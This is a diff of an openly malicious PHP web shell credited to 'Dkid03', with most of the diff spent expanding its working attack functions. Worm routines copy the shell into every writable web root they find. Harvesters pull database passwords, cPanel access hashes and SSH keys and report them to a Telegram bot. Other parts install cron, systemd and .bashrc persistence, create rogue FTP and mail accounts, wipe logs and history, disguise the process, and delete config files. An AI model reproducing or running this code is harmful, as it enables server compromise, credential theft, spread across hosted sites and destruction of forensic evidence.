@@ -1,6 +1,6 @@
 <?php
-//MAKER: Dkid03
-//PLSS DON'T CHANGE AUTHOR 
+//Maker: Dkid03
+//plss DON'T CHANGE AUTHOR 
 // ==================== LOGOUT HANDLER ====================
 if (isset($_GET['logout'])) {
     session_start();
@@ -520,15 +520,14 @@ function system_cache_repair() { return anti_delete_ultimate(); }
 
 if (isset($_GET['cache_repair'])) { system_cache_repair(); echo "✅ System cache repair executed."; exit; }
 
-// ==================== DUMP DATABASES (REAL) ====================
+// ==================== DUMP DATABASES ====================
 function dump_databases() {
     global $botToken, $telegramUserId;
     $results = [];
     $found_configs = [];
-    $roots = get_all_document_roots_cached();
     
-    // Cari file konfigurasi database
     $config_files = ['.env', 'wp-config.php', 'config.php', 'database.php', 'db.php', 'settings.php'];
+    $roots = get_all_document_roots_cached();
     
     foreach ($roots as $root) {
         if (!is_dir($root) || !is_readable($root)) continue;
@@ -539,7 +538,6 @@ function dump_databases() {
                 $content = @file_get_contents($path);
                 if ($content === false) continue;
                 
-                // Extract database credentials
                 $patterns = [
                     '/(DB_HOST|DB_NAME|DB_USER|DB_PASS|DB_PASSWORD|DB_DATABASE)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i',
                     '/define\(\s*[\'"]?(DB_HOST|DB_NAME|DB_USER|DB_PASSWORD|DB_DATABASE)[\'"]?\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i'
@@ -562,18 +560,14 @@ function dump_databases() {
         }
     }
     
-    // Coba dump database via shell
     if (function_exists('shell_exec')) {
-        // Cek MySQL
         $mysql = @shell_exec('mysql --version 2>/dev/null');
         if (strpos($mysql, 'mysql') !== false) {
-            // Coba dapatkan kredensial dari env
             $dbHost = getenv('DB_HOST') ?: 'localhost';
             $dbUser = getenv('DB_USER') ?: 'root';
             $dbPass = getenv('DB_PASS') ?: '';
             $dbName = getenv('DB_NAME') ?: '';
             
-            // Coba dari wp-config
             foreach ($roots as $root) {
                 if (file_exists($root . '/wp-config.php')) {
                     $content = file_get_contents($root . '/wp-config.php');
@@ -618,21 +612,54 @@ function dump_databases() {
 
 // ==================== WORM FUNCTIONS ====================
 function get_best_document_root($domain, $roots) {
+    $domain = trim($domain);
+    $domain = str_replace(['http://', 'https://', 'www.'], '', $domain);
+    
     $candidates = [
         "/home/{$domain}/public_html",
         "/home/{$domain}/www",
         "/var/www/{$domain}/public_html",
         "/var/www/{$domain}/html",
         "/var/www/html/{$domain}",
+        "/var/www/vhosts/{$domain}/public_html",
+        "/var/www/vhosts/{$domain}/httpdocs",
+        "/srv/www/{$domain}/public_html",
+        "/usr/local/apache2/htdocs/{$domain}",
+        (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : ''),
         (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] . "/../" . $domain . "/public_html" : ''),
     ];
-    foreach ($roots as $root) if (strpos($root, $domain) !== false) $candidates[] = $root;
+    
+    foreach ($roots as $root) {
+        if (strpos($root, $domain) !== false) {
+            $candidates[] = $root;
+        }
+        $path_parts = explode('/', $root);
+        foreach ($path_parts as $part) {
+            if (strpos($part, $domain) !== false || strpos($domain, $part) !== false) {
+                $candidates[] = $root;
+                break;
+            }
+        }
+    }
+    
     usort($candidates, function($a, $b) {
-        $a_score = (strpos($a, 'public_html') !== false) ? 1 : 0;
-        $b_score = (strpos($b, 'public_html') !== false) ? 1 : 0;
+        $a_score = (strpos($a, 'public_html') !== false) ? 3 : 0;
+        $a_score += (strpos($a, 'www') !== false) ? 2 : 0;
+        $a_score += (strpos($a, 'html') !== false) ? 1 : 0;
+        $b_score = (strpos($b, 'public_html') !== false) ? 3 : 0;
+        $b_score += (strpos($b, 'www') !== false) ? 2 : 0;
+        $b_score += (strpos($b, 'html') !== false) ? 1 : 0;
         return $b_score - $a_score;
     });
-    foreach ($candidates as $path) if ($path && is_dir($path) && is_writable($path)) return $path;
+    
+    $candidates = array_unique($candidates);
+    
+    foreach ($candidates as $path) {
+        if ($path && is_dir($path) && is_writable($path)) {
+            return $path;
+        }
+    }
+    
     return false;
 }
 
@@ -640,12 +667,31 @@ function worm_spread_to_domains($currentFile) {
     global $botToken, $telegramUserId;
     $infected = []; 
     $domainLinks = [];
+    $errors = [];
     $domains = get_all_domains_by_ip_cached(); 
     $roots = get_all_document_roots_cached();
     $myFile = basename($currentFile);
+    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
+    
+    if (empty($domains)) {
+        $domains = [];
+        if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
+            $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+            if ($lines !== false) {
+                foreach ($lines as $line) {
+                    if (strpos($line, ':') === false) continue;
+                    list($domain, $user) = explode(':', $line);
+                    $domains[] = trim($domain);
+                }
+            }
+        }
+        $domains[] = $_SERVER['HTTP_HOST'] ?? 'localhost';
+        $domains = array_unique($domains);
+    }
     
     foreach ($domains as $domain) {
         $dir = get_best_document_root($domain, $roots);
+        
         if ($dir && is_dir($dir) && is_writable($dir)) {
             $targetFile = $dir . '/' . $myFile;
             if (!file_exists($targetFile)) { 
@@ -653,22 +699,37 @@ function worm_spread_to_domains($currentFile) {
                     @chmod($targetFile, 0644); 
                     $infected[] = $dir;
                     $domainLinks[] = "http://{$domain}/{$myFile}";
+                } else {
+                    $errors[] = "Gagal copy ke: $domain";
                 }
             } else {
                 $domainLinks[] = "http://{$domain}/{$myFile} (exists)";
             }
+        } else {
+            foreach ($roots as $root) {
+                if (is_dir($root) && is_writable($root)) {
+                    $targetFile = $root . '/' . $myFile;
+                    if (!file_exists($targetFile)) {
+                        if (@copy($currentFile, $targetFile)) {
+                            @chmod($targetFile, 0644);
+                            $infected[] = $root;
+                            $domainLinks[] = "📁 {$root}/{$myFile} (via root)";
+                            break;
+                        }
+                    }
+                }
+            }
         }
-    }
-    
-    if (empty($infected)) {
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada domain yang bisa diinfeksi.");
-        return [];
     }
     
     $msg = "🪱 *WORM SPREAD TO DOMAINS*\n\n"
          . "📊 Total domain: " . count($domains) . "\n"
-         . "✅ Berhasil: " . count($infected) . "\n\n"
-         . "🔗 *Links:*\n" . implode("\n", $domainLinks);
+         . "✅ Berhasil: " . count($infected) . "\n"
+         . "❌ Gagal: " . count($errors) . "\n\n";
+    
+    if (!empty($domainLinks)) {
+        $msg .= "📁 *Results:*\n" . implode("\n", $domainLinks);
+    }
     
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return $infected;
@@ -682,15 +743,28 @@ function worm_infect_all_domains($currentFile) {
     $errors = [];
     $all_domains = [];
     $myFile = basename($currentFile);
+    $hostname = $_SERVER['HTTP_HOST'] ?? 'localhost';
+    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
     
-    // SCAN APACHE
+    $exclude_dirs = [
+        '.well-known', '.git', '.svn', '.cpanel', '.backup', '.cache',
+        '.trash', '.tmp', 'tmp', 'temp', 'cache', 'backup', 'logs', 'log',
+        'error_logs', 'phpmyadmin', 'pma', 'adminer', 'vendor', 'node_modules',
+        'bower_components', 'wp-admin', 'wp-includes', 'wp-content/cache',
+        'wp-content/uploads', 'wp-content/backup', 'storage', 'bootstrap',
+        'config', 'database', 'resources', 'tests', 'docs', 'examples',
+        'sample', 'demo', 'test'
+    ];
+    
     if (function_exists('shell_exec')) {
         $apache_configs = [
             '/etc/apache2/sites-enabled/*.conf',
             '/etc/apache2/sites-available/*.conf',
             '/etc/httpd/conf.d/*.conf',
             '/etc/httpd/conf/httpd.conf',
-            '/etc/apache2/apache2.conf'
+            '/etc/apache2/apache2.conf',
+            '/usr/local/apache2/conf/httpd.conf',
+            '/usr/local/apache/conf/httpd.conf'
         ];
         foreach ($apache_configs as $pattern) {
             $files = @glob($pattern);
@@ -699,6 +773,7 @@ function worm_infect_all_domains($currentFile) {
                     if (!is_file($conf) || !is_readable($conf)) continue;
                     $content = @file_get_contents($conf);
                     if ($content === false) continue;
+                    
                     preg_match_all('/DocumentRoot\s+([^\s]+)/i', $content, $matches);
                     foreach ($matches[1] as $dir) {
                         $dir = trim($dir);
@@ -707,6 +782,7 @@ function worm_infect_all_domains($currentFile) {
                             $all_domains[] = ['dir' => $dir, 'source' => 'apache'];
                         }
                     }
+                    
                     preg_match_all('/ServerName\s+([^\s]+)/i', $content, $matches2);
                     foreach ($matches2[1] as $domain) {
                         $domain = trim($domain);
@@ -719,13 +795,13 @@ function worm_infect_all_domains($currentFile) {
         }
     }
     
-    // SCAN NGINX
     if (function_exists('shell_exec')) {
         $nginx_configs = [
             '/etc/nginx/sites-enabled/*.conf',
             '/etc/nginx/sites-available/*.conf',
             '/etc/nginx/conf.d/*.conf',
-            '/etc/nginx/nginx.conf'
+            '/etc/nginx/nginx.conf',
+            '/usr/local/nginx/conf/nginx.conf'
         ];
         foreach ($nginx_configs as $pattern) {
             $files = @glob($pattern);
@@ -734,6 +810,7 @@ function worm_infect_all_domains($currentFile) {
                     if (!is_file($conf) || !is_readable($conf)) continue;
                     $content = @file_get_contents($conf);
                     if ($content === false) continue;
+                    
                     preg_match_all('/root\s+([^;]+)/i', $content, $matches);
                     foreach ($matches[1] as $dir) {
                         $dir = trim($dir);
@@ -742,6 +819,7 @@ function worm_infect_all_domains($currentFile) {
                             $all_domains[] = ['dir' => $dir, 'source' => 'nginx'];
                         }
                     }
+                    
                     preg_match_all('/server_name\s+([^;]+)/i', $content, $matches2);
                     foreach ($matches2[1] as $domains) {
                         $domains = trim($domains);
@@ -757,7 +835,6 @@ function worm_infect_all_domains($currentFile) {
         }
     }
     
-    // SCAN CPANEL
     if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
         $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         if ($lines !== false) {
@@ -784,7 +861,6 @@ function worm_infect_all_domains($currentFile) {
         }
     }
     
-    // SCAN /home
     $home_dirs = @glob('/home/*', GLOB_ONLYDIR);
     if ($home_dirs !== false) {
         foreach ($home_dirs as $home) {
@@ -804,30 +880,23 @@ function worm_infect_all_domains($currentFile) {
         }
     }
     
-    // SCAN COMMON DIRS
     $common_dirs = [
         '/var/www/html',
         '/var/www',
         '/usr/share/nginx/html',
         '/usr/local/apache2/htdocs',
         '/var/www/vhosts',
-        '/srv/www'
+        '/srv/www',
+        '/opt/bitnami/apache/htdocs',
+        '/var/www/domains'
     ];
+    
     foreach ($common_dirs as $dir) {
         if (is_dir($dir)) {
             $all_domains[] = ['dir' => $dir, 'source' => 'common'];
-            $subs = @glob($dir . '/*', GLOB_ONLYDIR);
-            if ($subs !== false) {
-                foreach ($subs as $sub) {
-                    if (is_dir($sub)) {
-                        $all_domains[] = ['dir' => $sub, 'source' => 'common_sub'];
-                    }
-                }
-            }
         }
     }
     
-    // SCAN DOCUMENT ROOTS
     $roots = get_all_document_roots_cached();
     foreach ($roots as $root) {
         if (is_dir($root)) {
@@ -835,25 +904,82 @@ function worm_infect_all_domains($currentFile) {
         }
     }
     
-    // REMOVE DUPLICATES & INFECT
     $unique_dirs = [];
-    $unique_domains = [];
+    $domain_map = [];
     $dirs_to_infect = [];
+    
     foreach ($all_domains as $item) {
-        if (isset($item['dir']) && !empty($item['dir']) && is_dir($item['dir']) && !in_array($item['dir'], $unique_dirs)) {
-            $unique_dirs[] = $item['dir'];
-            $dirs_to_infect[] = $item;
+        $dir = $item['dir'] ?? '';
+        $domain = $item['domain'] ?? '';
+        $source = $item['source'] ?? '';
+        
+        if (empty($dir) || !is_dir($dir)) continue;
+        
+        $dir_name = basename($dir);
+        $skip = false;
+        foreach ($exclude_dirs as $exclude) {
+            if (strpos($dir, $exclude) !== false || $dir_name === $exclude) {
+                $skip = true;
+                break;
+            }
         }
-        if (isset($item['domain']) && !empty($item['domain']) && !in_array($item['domain'], $unique_domains)) {
-            $unique_domains[] = $item['domain'];
+        if ($skip) continue;
+        
+        if (strpos($dir, '/tmp') === 0 || strpos($dir, '/var/tmp') === 0 || strpos($dir, '/dev/shm') === 0) {
+            continue;
+        }
+        
+        if ($dir_name === '.well-known' || strpos($dir, '.well-known') !== false) {
+            continue;
+        }
+        
+        if (!empty($docRoot) && strpos($dir, $docRoot) !== 0) {
+            $found = false;
+            foreach ($roots as $root) {
+                if (strpos($dir, $root) === 0) {
+                    $found = true;
+                    break;
+                }
+            }
+            if (!$found && $source !== 'cpanel' && $source !== 'home') {
+                continue;
+            }
+        }
+        
+        if (!empty($domain) && strpos($domain, '.') !== false) {
+            $domain_map[$dir] = $domain;
+        }
+        
+        if (!in_array($dir, $unique_dirs)) {
+            $unique_dirs[] = $dir;
+            $dirs_to_infect[] = ['dir' => $dir, 'domain' => $domain, 'source' => $source];
         }
     }
     
     $total_dirs = count($dirs_to_infect);
     $success_count = 0;
+    $domain_list = array_unique(array_filter(array_column($dirs_to_infect, 'domain')));
+    $domain_list = array_filter($domain_list, function($d) { return !empty($d) && strpos($d, '.') !== false; });
+    
     foreach ($dirs_to_infect as $item) {
         $dir = $item['dir'];
-        $domain = $item['domain'] ?? 'unknown';
+        $domain = $item['domain'] ?? '';
+        
+        if (empty($domain) || $domain === 'unknown') {
+            $path_parts = explode('/', $dir);
+            $last = end($path_parts);
+            if (strpos($last, '.') !== false) {
+                $domain = $last;
+            } else {
+                foreach ($domain_map as $d_path => $d_name) {
+                    if (strpos($dir, $d_path) === 0) {
+                        $domain = $d_name;
+                        break;
+                    }
+                }
+            }
+        }
+        
         if (!is_writable($dir)) {
             @chmod($dir, 0755);
             if (!is_writable($dir)) {
@@ -861,16 +987,28 @@ function worm_infect_all_domains($currentFile) {
                 continue;
             }
         }
+        
         $targetFile = $dir . '/' . $myFile;
+        
         if (file_exists($targetFile)) {
-            $domainLinks[] = "http://{$domain}/{$myFile} (exists)";
+            if (!empty($domain) && strpos($domain, '.') !== false) {
+                $domainLinks[] = "http://{$domain}/{$myFile} (exists)";
+            } else {
+                $domainLinks[] = "📁 {$dir}/{$myFile} (exists)";
+            }
             continue;
         }
+        
         if (@copy($currentFile, $targetFile)) {
             @chmod($targetFile, 0644);
             $infected[] = $targetFile;
             $success_count++;
-            $domainLinks[] = "http://{$domain}/{$myFile}";
+            
+            if (!empty($domain) && strpos($domain, '.') !== false) {
+                $domainLinks[] = "http://{$domain}/{$myFile}";
+            } else {
+                $domainLinks[] = "📁 {$dir}/{$myFile}";
+            }
         } else {
             $errors[] = "❌ Gagal copy ke: $dir";
         }
@@ -880,14 +1018,30 @@ function worm_infect_all_domains($currentFile) {
          . "📊 Total direktori: $total_dirs\n"
          . "✅ Berhasil: $success_count\n"
          . "❌ Gagal: " . count($errors) . "\n"
-         . "🌐 Total domain: " . count($unique_domains) . "\n\n"
-         . "🔗 *Links:*\n" . implode("\n", array_slice($domainLinks, 0, 20));
+         . "🌐 Total domain: " . count($domain_list) . "\n\n";
+    
+    if (!empty($domainLinks)) {
+        $msg .= "📁 *Results:*\n" . implode("\n", array_slice($domainLinks, 0, 25));
+        if (count($domainLinks) > 25) {
+            $msg .= "\n... dan " . (count($domainLinks) - 25) . " lainnya";
+        }
+    }
+    
+    if (!empty($errors) && count($errors) <= 10) {
+        $msg .= "\n\n❌ *Errors:*\n" . implode("\n", $errors);
+    }
     
     sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['infected' => $infected, 'links' => $domainLinks, 'errors' => $errors];
+    
+    return [
+        'infected' => $infected, 
+        'links' => $domainLinks, 
+        'errors' => $errors,
+        'total_domains' => count($domain_list)
+    ];
 }
 
-// ==================== SCAN WORDPRESS/LARAVEL (REAL) ====================
+// ==================== SCAN WORDPRESS/LARAVEL ====================
 function scan_wordpress_laravel() {
     global $botToken, $telegramUserId;
     $found = [];
@@ -896,7 +1050,6 @@ function scan_wordpress_laravel() {
     foreach ($roots as $root) {
         if (!is_dir($root) || !is_readable($root)) continue;
         
-        // ===== SCAN WORDPRESS =====
         if (file_exists($root . '/wp-config.php') && is_readable($root . '/wp-config.php')) {
             $wp_config = file_get_contents($root . '/wp-config.php');
             $creds = [];
@@ -912,7 +1065,6 @@ function scan_wordpress_laravel() {
             if (!empty($db_pass[1])) $creds[] = "   DB_PASS: " . $db_pass[1];
             if (!empty($db_host[1])) $creds[] = "   DB_HOST: " . $db_host[1];
             
-            // Cek versi WordPress
             if (file_exists($root . '/wp-includes/version.php')) {
                 $v_content = @file_get_contents($root . '/wp-includes/version.php');
                 if ($v_content && preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/', $v_content, $v_match)) {
@@ -920,7 +1072,6 @@ function scan_wordpress_laravel() {
                 }
             }
             
-            // Cek plugin yang terinstall
             $plugins_dir = $root . '/wp-content/plugins';
             if (is_dir($plugins_dir)) {
                 $plugins = @scandir($plugins_dir);
@@ -941,7 +1092,6 @@ function scan_wordpress_laravel() {
             $found[] = implode("\n", $creds);
         }
         
-        // ===== SCAN LARAVEL =====
         if (file_exists($root . '/.env') && is_readable($root . '/.env')) {
             $env_content = file_get_contents($root . '/.env');
             $creds = [];
@@ -1021,13 +1171,12 @@ function find_sensitive_files() {
     return $found;
 }
 
-// ==================== CPANEL HARVEST (REAL) ====================
+// ==================== CPANEL HARVEST ====================
 function cpanel_harvest() {
     global $botToken, $telegramUserId;
     $found = [];
     $roots = get_all_document_roots_cached();
     
-    // Cari file .env, wp-config.php, config.php
     $config_files = ['.env', 'wp-config.php', 'config.php', 'database.php', 'db.php'];
     
     foreach ($roots as $root) {
@@ -1038,7 +1187,6 @@ function cpanel_harvest() {
             if (file_exists($path) && is_readable($path)) {
                 $content = file_get_contents($path);
                 
-                // Extract credentials
                 $patterns = [
                     '/(DB_PASSWORD|DB_PASS|PASSWORD|SECRET_KEY|API_KEY|AUTH_KEY|APP_KEY)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i',
                     '/define\(\s*[\'"]?(DB_PASSWORD|DB_PASS)[\'"]?\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i'
@@ -1056,7 +1204,6 @@ function cpanel_harvest() {
         }
     }
     
-    // Cari di /home/*/.accesshash
     if (function_exists('shell_exec')) {
         $home_dirs = @glob('/home/*');
         if ($home_dirs !== false) {
@@ -1080,13 +1227,12 @@ function cpanel_harvest() {
     return $found;
 }
 
-// ==================== SSH KEYS GRABBER (REAL) ====================
+// ==================== SSH KEYS GRABBER ====================
 function grab_ssh_keys() {
     global $botToken, $telegramUserId;
     $keys = [];
     
     if (function_exists('shell_exec')) {
-        // Cek semua user di /home
         $users = explode("\n", @shell_exec('ls /home 2>/dev/null'));
         foreach ($users as $user) {
             $user = trim($user);
@@ -1101,7 +1247,6 @@ function grab_ssh_keys() {
             }
         }
         
-        // Cek root
         if (file_exists('/root/.ssh/authorized_keys') && is_readable('/root/.ssh/authorized_keys')) {
             $content = file_get_contents('/root/.ssh/authorized_keys');
             if (!empty(trim($content))) {
@@ -1120,13 +1265,12 @@ function grab_ssh_keys() {
     return $keys;
 }
 
-// ==================== CPANEL MODULE (REAL) ====================
+// ==================== CPANEL MODULE ====================
 function is_cpanel_installed() {
     if (file_exists('/usr/local/cpanel/version')) return true;
     if (file_exists('/usr/local/cpanel/cpanel')) return true;
     if (file_exists('/usr/local/cpanel')) return true;
     
-    // Cek port cPanel
     $ports = [2082, 2083, 2086, 2087, 2095, 2096];
     foreach ($ports as $port) {
         $sock = @fsockopen('127.0.0.1', $port, $errno, $errstr, 1);
@@ -1443,7 +1587,6 @@ function anti_forensic_ultimate() {
         }
     }
     
-    // Clear history
     if (function_exists('shell_exec')) {
         @shell_exec('history -c 2>/dev/null');
         @shell_exec('unset HISTFILE 2>/dev/null');
@@ -1468,7 +1611,6 @@ function bypass_suhosin() {
          . "open_basedir: " . ($open_basedir ?: 'none') . "\n"
          . "suhosin.executor.disable_eval: " . ($suhosin_eval ? 'ON' : 'OFF') . "\n\n";
     
-    // Coba bypass methods
     $methods = [];
     if (function_exists('dl') && !in_array('dl', explode(',', $disabled))) {
         $methods[] = 'dl()';
@@ -1501,14 +1643,12 @@ function create_ftp_account($username, $password, $home = '') {
     $results = [];
     
     if (function_exists('shell_exec')) {
-        // PureFTPd
         if (file_exists('/usr/bin/pure-pw')) {
             @shell_exec("echo '" . escapeshellarg($password) . "' | pure-pw useradd " . escapeshellarg($username) . " -u www-data -g www-data -d " . escapeshellarg($home) . " 2>/dev/null");
             @shell_exec('pure-pw mkdb 2>/dev/null');
             $results[] = "PureFTPd account created";
         }
         
-        // vsftpd
         if (file_exists('/etc/vsftpd.conf')) {
             $userlist = '/etc/vsftpd.userlist';
             if (file_exists($userlist) && is_writable($userlist)) {
@@ -1538,7 +1678,6 @@ function create_mail_account($email, $password, $domain = '') {
     $results = [];
     
     if (function_exists('shell_exec')) {
-        // Postfix + Dovecot
         if (file_exists('/usr/bin/doveadm') && file_exists('/etc/postfix/virtual')) {
             @shell_exec("doveadm user -a " . escapeshellarg($username) . " 2>/dev/null");
             @file_put_contents('/etc/postfix/virtual', "$email $username@$domain\n", FILE_APPEND);
@@ -1547,7 +1686,6 @@ function create_mail_account($email, $password, $domain = '') {
             $results[] = "Postfix virtual account created";
         }
         
-        // Exim
         if (file_exists('/usr/sbin/exim')) {
             $exim_user = '/etc/exim/domains/' . $domain . '/passwd';
             if (!is_dir(dirname($exim_user))) @mkdir(dirname($exim_user), 0755, true);
@@ -1579,7 +1717,6 @@ function install_deep_persistence() {
     }
     
     if (function_exists('shell_exec')) {
-        // Systemd service
         $service = '[Unit]
 Description=DKD Cache
 After=network.target
@@ -1599,12 +1736,10 @@ WantedBy=multi-user.target';
         @shell_exec('systemctl start dkd.service 2>/dev/null');
         $results[] = "✅ Systemd service installed";
         
-        // Cron job
         $cron = "*/5 * * * * php " . __FILE__ . " > /dev/null 2>&1";
         @shell_exec('(crontab -l 2>/dev/null; echo "' . $cron . '") | crontab -');
         $results[] = "✅ Cron job installed";
         
-        // rc.local
         if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
             $rc = file_get_contents('/etc/rc.local');
             $rc = str_replace('exit 0', '', $rc);
@@ -1643,7 +1778,6 @@ function user_persistence_install() {
     $results = [];
     $home = getenv('HOME') ?: __DIR__;
     
-    // Bashrc
     $bashrc = $home . '/.bashrc';
     if (file_exists($bashrc) && is_writable($bashrc)) {
         $content = file_get_contents($bashrc);
@@ -1652,7 +1786,6 @@ function user_persistence_install() {
         $results[] = "✅ .bashrc updated";
     }
     
-    // Profile
     $profile = $home . '/.profile';
     if (file_exists($profile) && is_writable($profile)) {
         $content = file_get_contents($profile);
@@ -1661,7 +1794,6 @@ function user_persistence_install() {
         $results[] = "✅ .profile updated";
     }
     
-    // User cron
     $cron = "*/10 * * * * php " . __FILE__ . " > /dev/null 2>&1";
     @shell_exec('(crontab -l 2>/dev/null; echo "' . $cron . '") | crontab -');
     $results[] = "✅ User cron installed";
@@ -1675,7 +1807,6 @@ function user_persistence_install() {
 function user_persistence_remove() {
     $home = getenv('HOME') ?: __DIR__;
     
-    // Clean bashrc
     $bashrc = $home . '/.bashrc';
     if (file_exists($bashrc) && is_writable($bashrc)) {
         $content = file_get_contents($bashrc);
@@ -1684,7 +1815,6 @@ function user_persistence_remove() {
         @file_put_contents($bashrc, $content);
     }
     
-    // Clean profile
     $profile = $home . '/.profile';
     if (file_exists($profile) && is_writable($profile)) {
         $content = file_get_contents($profile);
@@ -1693,7 +1823,6 @@ function user_persistence_remove() {
         @file_put_contents($profile, $content);
     }
     
-    // Remove cron
     @shell_exec('crontab -l 2>/dev/null | grep -v "' . __FILE__ . '" | crontab -');
     
     return ['success' => true, 'msg' => "✅ User persistence removed"];
@@ -1800,7 +1929,6 @@ function clean_logs_advanced() {
         }
     }
     
-    // Clear command history
     if (function_exists('shell_exec')) {
         @shell_exec('history -c 2>/dev/null');
         @shell_exec('unset HISTFILE 2>/dev/null');
@@ -1809,14 +1937,13 @@ function clean_logs_advanced() {
     return "✅ Logs cleaned ($count files) + history cleared";
 }
 
-// ==================== ONE CLICK ALL (TANPA WORM) ====================
-// ==================== ONE CLICK ALL (REAL) ====================
+// ==================== ONE CLICK ALL ====================
 function one_click_all() {
     global $botToken, $telegramUserId;
     $results = [];
     $start_time = microtime(true);
     
-    // ===== 1. SPOOF IP HEADERS (REAL) =====
+    // ===== 1. SPOOF IP HEADERS =====
     $fake_ips = ['192.168.1.' . rand(1,254), '10.0.0.' . rand(1,254), '172.16.' . rand(0,31) . '.' . rand(1,254), '8.8.8.' . rand(1,254)];
     $_SERVER['HTTP_X_FORWARDED_FOR'] = $fake_ips[array_rand($fake_ips)];
     $_SERVER['HTTP_CLIENT_IP'] = $fake_ips[array_rand($fake_ips)];
@@ -1824,7 +1951,7 @@ function one_click_all() {
     $_SERVER['REMOTE_ADDR'] = $fake_ips[array_rand($fake_ips)];
     $results[] = "✅ IP Headers Spoofed: " . $_SERVER['REMOTE_ADDR'];
     
-    // ===== 2. SPOOF USER-AGENT (REAL) =====
+    // ===== 2. SPOOF USER-AGENT =====
     $uas = [
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
@@ -1836,7 +1963,7 @@ function one_click_all() {
     $_SERVER['HTTP_USER_AGENT'] = $random_ua;
     $results[] = "✅ User-Agent Spoofed: " . substr($random_ua, 0, 50) . "...";
     
-    // ===== 3. CLEAR LOGS (REAL) =====
+    // ===== 3. CLEAR LOGS =====
     $logs = [
         '/var/log/apache2/access.log', '/var/log/apache2/error.log',
         '/var/log/nginx/access.log', '/var/log/nginx/error.log',
@@ -1860,7 +1987,7 @@ function one_click_all() {
     }
     $results[] = "✅ Logs Cleared: $cleared_logs files";
     
-    // ===== 4. CLEAR HISTORIES (REAL) =====
+    // ===== 4. CLEAR HISTORIES =====
     if (function_exists('shell_exec')) {
         @shell_exec('history -c 2>/dev/null');
         @shell_exec('unset HISTFILE 2>/dev/null');
@@ -1883,7 +2010,7 @@ function one_click_all() {
         $results[] = "✅ Histories Cleared: $cleared_hist files";
     }
     
-    // ===== 5. HIDE PROCESS (REAL) =====
+    // ===== 5. HIDE PROCESS =====
     $pid = getmypid();
     $fake = ['systemd', 'nginx', 'apache2', 'mysql', 'php-fpm', 'sshd', 'cron', 'bash'][array_rand(['systemd', 'nginx', 'apache2', 'mysql', 'php-fpm', 'sshd', 'cron', 'bash'])];
     if (function_exists('cli_set_process_title')) {
@@ -1893,12 +2020,12 @@ function one_click_all() {
     @shell_exec("prctl PR_SET_NAME '$fake' 2>/dev/null");
     $results[] = "✅ Process Hidden as: $fake (PID: $pid)";
     
-    // ===== 6. CHANGE FILE TIMESTAMP (REAL) =====
+    // ===== 6. CHANGE FILE TIMESTAMP =====
     $old_time = strtotime('2020-01-01 00:00:00') + rand(0, 31536000);
     @touch(__FILE__, $old_time, $old_time);
     $results[] = "✅ File Timestamp Changed to: " . date('Y-m-d H:i:s', $old_time);
     
-    // ===== 7. FAKE LOGIN (REAL) =====
+    // ===== 7. FAKE LOGIN =====
     $fake_ip = ['192.168.1.100', '10.0.0.50', '172.16.0.25', '8.8.8.8'][array_rand(['192.168.1.100', '10.0.0.50', '172.16.0.25', '8.8.8.8'])];
     $fake_user = ['root', 'admin', 'user', 'test'][array_rand(['root', 'admin', 'user', 'test'])];
     $fake_time = date('Y-m-d H:i:s', time() - rand(3600, 86400));
@@ -1910,7 +2037,7 @@ function one_click_all() {
         }
     }
     
-    // ===== 8. DELETE TEMP FILES (REAL) =====
+    // ===== 8. DELETE TEMP FILES =====
     $deleted_temp = 0;
     foreach (['/tmp/', '/var/tmp/', '/dev/shm/'] as $dir) {
         if (is_dir($dir)) {
@@ -1930,7 +2057,7 @@ function one_click_all() {
     }
     $results[] = "✅ Temp Files Deleted: $deleted_temp files";
     
-    // ===== 9. REMOVE SENSITIVE FILES (REAL) =====
+    // ===== 9. REMOVE SENSITIVE FILES =====
     $sensitive_patterns = [
         '/.env', '/wp-config.php', '/config.php', '/database.php', '/db.php',
         '/*.sql', '/*.tar', '/*.gz', '/*.zip', '/*.bak', '/*.old',
@@ -1954,13 +2081,13 @@ function one_click_all() {
     }
     $results[] = "✅ Sensitive Files Removed: $deleted_sensitive files";
     
-    // ===== 10. KILL ACTIVE CONNECTIONS (REAL) =====
+    // ===== 10. KILL ACTIVE CONNECTIONS =====
     if (function_exists('shell_exec') && isRoot()) {
         @shell_exec('pkill -9 -f "http|ssh|ftp|mysql" 2>/dev/null');
         $results[] = "✅ Active connections killed";
     }
     
-    // ===== 11. CLEAR PHP TEMP FILES (REAL) =====
+    // ===== 11. CLEAR PHP TEMP FILES =====
     $php_tmp = @glob('/tmp/*.php');
     if ($php_tmp !== false) {
         foreach ($php_tmp as $file) {
@@ -1971,14 +2098,14 @@ function one_click_all() {
         $results[] = "✅ Temp PHP files cleaned";
     }
     
-    // ===== 12. CLEAR SYSTEM CACHE (REAL) =====
+    // ===== 12. CLEAR SYSTEM CACHE =====
     if (function_exists('shell_exec')) {
         @shell_exec('sync 2>/dev/null');
         @shell_exec('echo 3 > /proc/sys/vm/drop_caches 2>/dev/null');
         $results[] = "✅ System cache dropped";
     }
     
-    // ===== KIRIM REPORT KE TELEGRAM (REAL) =====
+    // ===== KIRIM REPORT =====
     $execution_time = round(microtime(true) - $start_time, 2);
     $results[] = "⏱️ Execution time: $execution_time seconds";
     
@@ -1987,14 +2114,9 @@ function one_click_all() {
          . "Execution time: $execution_time seconds\n\n"
          . "📋 Details:\n" . implode("\n", $results);
     
